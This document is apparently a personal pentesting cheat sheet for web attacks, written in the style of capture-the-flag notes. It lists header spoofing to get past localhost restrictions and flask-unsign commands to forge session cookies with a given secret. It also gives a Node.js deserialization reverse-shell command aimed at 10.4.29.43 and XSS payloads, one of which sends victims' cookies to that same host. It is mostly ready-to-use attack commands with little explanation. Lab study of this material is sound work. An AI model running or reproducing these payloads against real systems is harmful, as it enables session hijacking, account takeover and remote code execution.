# HTTP
* [Basics](#basics)
  * [Headers](#headers)
* [Flask](#flask)
* [Java](#java)
* [XSS](#xss)
  * [DOM-Based](#dom-based)
  * [Stored](#stored)
  * [Reflected](#reflected)

## Basics
### Headers
**Add to bypass restrictions for localhost**
```
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1 
X-Forwarded-For: 127.0.0.1 
X-Remote-IP: 127.0.0.1 
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
```

## Flask
| Info | Command |
|:-----|:--------|
| Decrypt a token | `flask-unsign --decode --cookie $token` | 
| Set cookie variable | `cookie="{'name': b'change', 'value': 8, 'isWorking': True}"` | 
| Sign cookie | `flask-unsign --sign --cookie $cookie --secret '$twiking_!T_r!cH'` |

## Java
| Info | Command |
|:-----|:--------|
| Java / NodeJS Shell | `python /usr/local/sbin/nodejsshell.py 10.4.29.43 53` |

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/
https://github.com/joaomatosf/jexboss.git
https://www.cybersecpadawan.com/2020/04/tryhackme-tony-tiger-no-metasploit.html

## XSS
## DOM-Based
### Stored
Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.  

**Process**
1. Attacker inserts malicious payload into the website database.
2. For every visit to the website the malicious script is activated.
3. The data the attackers script gathered is sent to them. They could steal the victims cookie, which would allow the attacker to take over the victims account.

**Basic Payload**
```
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
**Show cookie**
`<script>alert(document.cookie)</script>`

**Change HTML object contents**
`<script> document.querySelector('#thm-title').textContent = 'I am a hacker' </script>`

**Steal a cookie**
`<script>window.location='http://10.4.29.43/?cookie='+document.cookie</script>`
### Reflected